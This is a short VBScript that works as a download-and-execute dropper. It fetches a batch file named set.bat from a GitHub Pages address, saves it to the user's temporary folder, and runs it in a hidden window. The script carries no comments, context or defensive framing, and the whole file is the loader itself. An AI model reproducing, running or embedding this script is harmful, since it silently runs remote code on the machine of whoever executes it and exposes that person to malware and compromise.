Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
tempFolder = WshShell.ExpandEnvironmentStrings("%TEMP%")
batPath = tempFolder & "\set.bat"

Set http = CreateObject("Microsoft.XMLHTTP")
http.Open "GET", "https://faisalabad23.github.io/test/set.bat", False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile batPath, 2
    stream.Close
    WshShell.Run Chr(34) & batPath & Chr(34), 0, False
End If
